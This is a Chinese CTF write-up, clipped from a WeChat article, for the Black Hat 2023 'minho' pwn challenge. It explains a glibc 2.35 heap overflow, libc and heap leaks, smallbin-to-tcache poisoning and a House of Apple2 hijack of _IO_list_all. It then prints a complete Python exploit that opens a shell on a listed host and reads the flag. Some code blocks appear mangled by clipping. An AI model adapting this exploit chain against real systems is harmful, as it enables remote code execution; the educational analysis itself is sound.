---
title: 【微信】[Black Hat 2023] Pwn House of minho 解题报告
source: https://mp.weixin.qq.com/s/7HZj14qHVJqvsozmGRFIZw
source_host: mp.weixin.qq.com
clip_date: 2026-09-20T18:26:43+08:00
trace_id: 402a3d7c-801e-4578-b5da-a038489ce811
content_hash: 5430c14b873542e526519b68c0f65cbcbdac34099c1947631bae0a57c908a186
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Black Hat 2023 minho 题利用 small chunk 堆溢出，配合 libc/heap 泄露与 smallbin-to-tcache，最终用 House of Apple2 劫持 _IO_list_all 获取 shell 并读 flag。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 3e175244-d011-81c8-ac8f-c7702fd9bf57
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Black Hat 2023 minho 题利用 small chunk 堆溢出，配合 libc/heap 泄露与 smallbin-to-tcache，最终用 House of Apple2 劫持 _IO_list_all 获取 shell 并读 flag。
> 
> - **漏洞点：** 选 small 时 malloc(0x40)，但 read 固定读入 0x80，可覆盖后续 chunk 的 size/fd/bk；全局仅一个指针，free 后置空，无直接 UAF。
> - **泄露 libc：** 先溢出改 Top Chunk size，再让 scanf 读超长输入触发 malloc/realloc/free，使旧 Top Chunk 进 Unsorted Bin，show 后减 `0x219ce0` 得 libc_base。
> - **泄露 heap：** GLIBC 2.35 tcache fd 使用 safe-linking；链表末尾 fd 为 0 时泄露值即 `heap_base >> 12`，故 `heap_base = leak << 12`。
> - **写任意地址：** 伪造可合并 fake chunk 与 smallbin bk 链，触发 smallbin-to-tcache，从而 tcache poisoning 获得一次写 libc 地址机会。
> - **House of Apple2：** Full RELRO 下改劫持 `_IO_list_all`，构造 fake _IO_FILE_plus，使 exit 走 `_IO_wfile_overflow` 并调用 `system("sh")`，最后执行 `cat /flag`。

**看雪学苑** *2026年9月20日 18:05*

1\. 题目信息

```
目标：
nc 123.57.66.184 10050
```

附件：

```
附件：
minho
main.c
Dockerfile
docker-compose.yml
```

最终 flag：

```
flag{bcddada9-b211-4c5d-8d04-282a53b2caff}
```

参考环境：

```
Ubuntu 22.04
GLIBC 2.35
PIE: enabled
NX: enabled
Canary: enabled
RELRO: Full RELRO
```

**2.漏洞点分析**  

## 漏洞点：small 堆溢出

源码核心如下：

```cpp
#define SIZE_SMALL 0x40
#define SIZE_BIG   0x80

char *g_buf;

case 1:
if (getint("Size [1=small / 2=big]: ") == 1) {
        g_buf = malloc(SIZE_SMALL);
    } else {
        g_buf = malloc(SIZE_BIG);
    }

printf("Data: ");
read(STDIN_FILENO, g_buf, SIZE_BIG);
    g_buf[strcspn(g_buf, "\n")] = '\0';
break;
```

当选择 small 时：

```
g_buf = malloc(0x40);
```

但输入时固定读入：

```
read(0, g_buf, 0x80);
```

所以 small chunk 存在堆溢出，可以覆盖后续 chunk 的 metadata，包括 size、fd、bk 等字段。

程序限制：

```
char *g_buf;
```

全局只有一个指针，delete 后会置空：

```
free(g_buf);
g_buf = NULL;
```

所以没有直接 UAF，但可以通过堆溢出、scanf 内部 malloc/realloc、tcache safe-linking 泄露与 smallbin-to-tcache 技巧完成利用。

**3.利用总体思路**  

## 四段利用链总览

利用链分四段：

```
1. 利用 scanf 读超长输入触发 malloc/realloc/free
2. 修改 Top Chunk size，让 Top Chunk 进入 Unsorted Bin，泄露 libc
3. 通过 tcache fd 的 safe-linking key 泄露 heap base
4. 伪造 smallbin 链，触发 smallbin-to-tcache，拿任意写
5. House of Apple2 劫持 _IO_list_all，触发 system("sh")
6. 执行 cat /flag
```

关键 libc 偏移：

```toml
main_arena_unsorted = 0x219ce0
smallbin_0x90_head  = 0x219d60
_IO_list_all        = 0x21a680
_IO_wfile_overflow  = 0x2160d8
system              = 0x50d60
```

**4.libc 泄露**  

## libc 基址泄露

先溢出修改 Top Chunk size：

```
add(1, b"a" * 0x48 + p64(0xd11))
```

然后向 scanf("%d%\*c") 输入超长数字：

```
sla(b"> ", b"0" * 0xfff + b"2")
```

scanf 内部会分配较大的缓冲区，大致触发：

```
malloc(0x800);
realloc(..., 0x1000);
realloc(..., 0x2000);
free(...);
```

配合被修改过的 Top Chunk size，可以让旧 Top Chunk 进入 Unsorted Bin。  

之后通过 small chunk 溢出覆盖并 show：

```sql
free()
add(1, b"a" *0x50)
show()
ru(b"a" *0x50)
libc_base = u64(io.recv(6).ljust(8, b"\x00")) -0x219ce0
```

**5.heap 泄露**  

## tcache 泄露 heap

glibc 2.35 的 tcache fd 使用 safe-linking：

```
encoded_fd = real_fd ^ (chunk_addr >> 12)
```

如果泄露 tcache 链表末尾 chunk 的 fd，由于真实 fd 为 0，所以泄露值就是：

```
heap_base >> 12
```

因此：

```
heap_base = leak << 12
```

对应利用：

```sql
free()
add(2, b"a")
free()

add(1, b"a" *0x50)
show()
ru(b"a" *0x50)

heap_base = u64(ru(b"\n")[:-1].ljust(8, b"\x00")) <<12
```

**6.smallbin-to-tcache**  

## 伪造 smallbin 进 tcache

目标是构造一个 fake smallbin 链，让 glibc 在从 smallbin 取 chunk 时，把链上的其它 chunk 自动填充进 tcache。  

先构造可被合并的 fake chunk：

```
add(
,

    b"a" * 0x10
    + p64(0)
    + p64(0x31)
    + 2 * p64(heap_base + 0x2c0)
    + b"a" * 0x10
    + p64(0x30)
    + p64(0xd00)
)
free()
```

布置哨兵块，避免 malloc/free 检查崩溃：

```
add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0) + p64(0x11))
free()
```

把 fake chunk size 改成 smallbin 大小：

```
add(1, b"a" * 0x10 + p64(0) + p64(0x91))
```

再次用 scanf 超长输入触发 unsorted bin 遍历，使 fake chunk 进入 smallbin：

```
sla(b"> ", b"0" * 0xfff + b"2")
```

然后伪造 smallbin bk 链：

```
add(1, flat_list([
0, 0,
0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x20,
0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x40,
0, 0x91, heap_base + 0x2c0 + 0x20, libc_base + 0x219d60,
]))
free()
```

触发 smallbin-to-tcache：

```
add(2, b"a")
free()
```

此时可以进行 tcache poisoning，获得一次写 libc 地址的机会。

**7.House of Apple2**  

## House of Apple2 劫持

由于 Full RELRO，不能改 GOT。这里选择劫持：

```
_IO_list_all
```

构造 fake \_IO_FILE_plus，让程序 exit 时触发：

```
exit
-> _IO_flush_all_lockp
-> _IO_wfile_overflow
->system("sh")
```

关键字段：

```toml
wide_data_off = 0xa0
vtable_off = 0xd8
wide_data_vtable_off = 0xe0

_IO_wfile_overflow_ptr = libc_base + 0x2160d8
_IO_list_all = libc_base + 0x21a680
system = libc_base + 0x50d60
```

写入 fake FILE：

```
add(2, flat_dict({
0x10: b"  sh;",
0x38: system,
0x68: 0x71,
0x70: _IO_list_all ^ (heap_base >> 12),
}, filler=b"\x00"))
```

继续补齐 wide_data 和 vtable：

```
add(2, flat_dict({
    wide_data_off - 0x60: heap_base + 0x2e0 + 0xd0 - wide_data_vtable_off,
0xd0 - 0x60: heap_base + 0x2e0 + 0x28 - do_alloc_off,
    vtable_off - 0x60: _IO_wfile_overflow_ptr - __overflow_off,
}, filler=b"\x00"))
```

最后劫持 \_IO_list_all：

```
add(2, p64(heap_base + 0x2e0))
```

退出触发：

```
sla(b"> ", b"4")
```

**8.完整 exploit**  

保存为：

```
exp_minho_pure.py
```

运行：

```
python3 exp_minho_pure.py 123.57.66.184 10050 --cmd "cat /flag; echo DONE"
```

完整代码：

```python
import socket, struct, time, argparse

MASK64 = (1 << 64) - 1

def p64(x): return struct.pack("<Q", x & MASK64)
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\x00")[:8])[0]

def flat_list(items):
    out = b""
for x in items:
        out += p64(x) if isinstance(x, int) else x
return out

def flat_dict(d, filler=b"\x00"):
    maxlen = 0
    vals = []
for off, val in d.items():
        b = p64(val) if isinstance(val, int) else val
        vals.append((off, b))
        maxlen = max(maxlen, off + len(b))

    out = bytearray(filler[:1] * maxlen)
for off, b in vals:
        out[off:off + len(b)] = b
return bytes(out)

class Tube:
def __init__(self, host, port, timeout=12):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""

def recv(self, n=4096):
if self.buf:
            b = self.buf[:n]
            self.buf = self.buf[n:]
return b
return self.s.recv(n)

def recvuntil(self, delim, drop=False):
while delim not in self.buf:
            chunk = self.s.recv(4096)
if not chunk:
break
            self.buf += chunk

        idx = self.buf.find(delim)
if idx >= 0:
            end = idx + len(delim)
            out = self.buf[:idx if drop else end]
            self.buf = self.buf[end:]
return out

        out = self.buf
        self.buf = b""
return out

def send(self, b):
if isinstance(b, str):
            b = b.encode()
        self.s.sendall(b)

def sendline(self, b):
if isinstance(b, str):
            b = b.encode()
        self.send(b + b"\n")

def sendafter(self, delim, b):
        self.recvuntil(delim)
        self.send(b)

def sendlineafter(self, delim, b):
        self.recvuntil(delim)
        self.sendline(b)

def clean(self, timeout=0.5):
        old = self.s.gettimeout()
        self.s.settimeout(timeout)
        out = self.buf
        self.buf = b""
while True:
try:
                c = self.s.recv(4096)
if not c:
break
                out += c
except socket.timeout:
break
        self.s.settimeout(old)
return out

def exploit(host, port, cmd):
    io = Tube(host, port)

    ru = io.recvuntil
    sla = io.sendlineafter
    sa = io.sendafter

def add(size, content):
        sla(b"> ", b"1")
        sla(b"Size [1=small / 2=big]: ", str(size).encode())
        sa(b"Data: ", content)

def show():
        sla(b"> ", b"2")

def free():
        sla(b"> ", b"3")

    sla(b"> ", b"0" * 0xd58 + b"3")

    add(1, b"a" * 0x48 + p64(0xd11))
    sla(b"> ", b"0" * 0xfff + b"2")

    free()
    add(1, b"a" * 0x50)
    show()
    ru(b"a" * 0x50)

    libc_base = u64(io.recv(6)) - 0x219ce0
print("[+] libc_base =", hex(libc_base))

    free()
    add(1, b"a" * 0x48 + p64(0xcf1))

    free()
    add(2, b"a")
    free()

    add(1, b"a" * 0x50)
    show()
    ru(b"a" * 0x50)

    heap_base = u64(ru(b"\n", drop=True)) << 12
print("[+] heap_base =", hex(heap_base))

    free()

    add(
,

b"a" * 0x10
        + p64(0)
        + p64(0x31)
        + 2 * p64(heap_base + 0x2c0)
        + b"a" * 0x10
        + p64(0x30)
        + p64(0xd00)
    )
    free()

    add(2, b"a" * 0x50 + p64(0x90) + p64(0x10) + p64(0) + p64(0x11))
    free()

    add(1, b"a" * 0x10 + p64(0) + p64(0x91))
    sla(b"> ", b"0" * 0xfff + b"2")

    free()

    add(1, flat_list([
0, 0,
0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x20,
0, 0x91, heap_base + 0x2c0, heap_base + 0x2c0 + 0x40,
0, 0x91, heap_base + 0x2c0 + 0x20, libc_base + 0x219d60,
    ]))
    free()

    add(2, b"a")
    free()

    wide_data_off = 0xa0
    vtable_off = 0xd8
    wide_data_vtable_off = 0xe0

    _IO_wfile_overflow_ptr = libc_base + 0x2160d8
    __overflow_off = 0x18
    do_alloc_off = 0x68

    _IO_list_all = libc_base + 0x21a680
    system = libc_base + 0x50d60

    add(
,

b"a" * 0x10
        + p64(0)
        + p64(0x71)
        + p64((heap_base + 0x2d0 + 0x70) ^ (heap_base >> 12))
    )
    free()

    add(2, flat_dict({
0x10: b"  sh;",
0x38: system,
0x68: 0x71,
0x70: _IO_list_all ^ (heap_base >> 12),
    }))
    free()

    add(2, flat_dict({
        wide_data_off - 0x60: heap_base + 0x2e0 + 0xd0 - wide_data_vtable_off,
0xd0 - 0x60: heap_base + 0x2e0 + 0x28 - do_alloc_off,
        vtable_off - 0x60: _IO_wfile_overflow_ptr - __overflow_off,
    }))
    free()

    add(2, p64(heap_base + 0x2e0))

    sla(b"> ", b"4")

    time.sleep(0.5)
print("[+] trigger:", repr(io.clean()))

    io.sendline(cmd)

    out = b""
    end = time.time() + 5
while time.time() < end:
try:
            chunk = io.s.recv(4096)
if not chunk:
break
            out += chunk
if b"DONE" in out:
break
except socket.timeout:
break

print(out.decode("latin-1", "replace"))

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="123.57.66.184")
    ap.add_argument("port", nargs="?", type=int, default=10050)
    ap.add_argument("--cmd", default="cat /flag; echo DONE")
    args = ap.parse_args()

    exploit(args.host, args.port, args.cmd.encode())
```

**9.结果**  

执行：

```
python3 exp_minho_pure.py 123.57.66.184 10050 --cmd "cat /flag; echo DONE"
```

输出：

```
[+] libc_base = 0x...
[+] heap_base = 0x...
[+] trigger: b'[+] Bye!\n'
flag{bcddada9-b211-4c5d-8d04-282a53b2caff}
DONE
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ce04542b59619607.png)

看雪ID：mb_dcvvjyqc

https://bbs.kanxue.com/user-home-946087.htm

\*本文为看雪论坛优秀文章，由 mb_dcvvjyqc 原创，转载请注明来自看雪社区

9月10日【议题征集】截止

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bc51e60a1ab9953f.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c953c0b9b281634c.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3bda3987c6441739.webp)

**球分享**

**球点赞**

**球在看**

点击阅读原文查看更多
